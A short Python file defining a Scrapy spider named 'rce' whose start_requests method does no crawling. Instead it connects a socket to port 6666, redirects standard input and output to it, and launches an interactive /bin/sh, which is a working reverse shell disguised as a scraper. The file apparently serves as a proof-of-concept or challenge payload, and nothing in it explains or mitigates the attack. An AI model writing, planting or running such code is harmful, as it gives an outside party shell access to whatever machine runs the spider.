import scrapy
import socket
import subprocess
import os


class RceSpider(scrapy.Spider):
    name = "rce"

    def start_requests(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("0.0.0.0", 6666))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        p = subprocess.call(["/bin/sh", "-i"])
